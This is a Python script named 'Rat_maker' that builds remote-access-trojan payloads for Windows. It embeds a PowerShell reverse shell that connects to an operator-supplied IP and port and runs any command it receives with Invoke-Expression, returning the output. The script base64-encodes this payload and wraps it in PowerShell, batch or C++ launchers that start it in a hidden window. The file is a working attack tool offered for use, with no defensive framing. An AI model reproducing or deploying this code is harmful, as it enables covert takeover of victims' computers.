import os
import time
import base64
import socket
import colorama

colorama.init()

print(colorama.Fore.RED + "\nRat_maker...\n")

payload_socket_powershell = """While($True){\nTry{$client = New-Object System.Net.Sockets.TcpClient;\n$client.Connect("<ip>", <port>);\n$stream = $client.GetStream();\nWhile ($True) {;\n$buffer = New-Object System.Byte[] 4024;\n$read = $stream.Read($buffer, 0, 4024);\n$msg = [System.Text.Encoding]::ASCII.GetString($buffer,0, $read);\n$Output = Invoke-Expression $msg 2>&1 | Out-String;\n$message = [System.Text.Encoding]::ASCII.GetBytes($Output);\n$stream.Write($message, 0, $message.Length);\n}\n} catch {\n}\n}"""

payloads = [
    ["powershell", payload_socket_powershell, "Start-Process powershell.exe {powershell.exe -enc", "} -WindowStyle hidden"],
    ["batch",      payload_socket_powershell, """powershell -Command "Start-Process powershell.exe {powershell.exe -enc""", """} -WindowStyle hidden" """],
    ["c++",        payload_socket_powershell, """#include <iostream>\nint main() {\nconst char* powershellCommand = R"(\npowershell.exe -Command "Start-Process powershell.exe { powershell.exe -enc """, """ }  -WindowStyle hidden"\n )";\nsystem(powershellCommand);\nreturn 0;\n}"""]
]

def encrypt_string(text):
    utf16le_bytes = text.encode('utf-16le')

    base64_encoded = base64.b64encode(utf16le_bytes).decode('utf-8')

    return base64_encoded

while True:
    print("")
    for i in range(len(payloads)):
        print(f"{colorama.Fore.GREEN}[{i}]-[{payloads[i][0]}]")
    print("")

    n = int(input(colorama.Fore.RED + f"@Rat_maker=>"))

    try:
        ip = input("IP>")
        port = input("PORT>")

        print(colorama.Fore.LIGHTBLUE_EX)
        print(payloads[n][2], encrypt_string(payloads[n][1].replace("<ip>", ip).replace("<port>", f"{port}")), payloads[n][3])
        print("")
        break

    except:
        print("error")
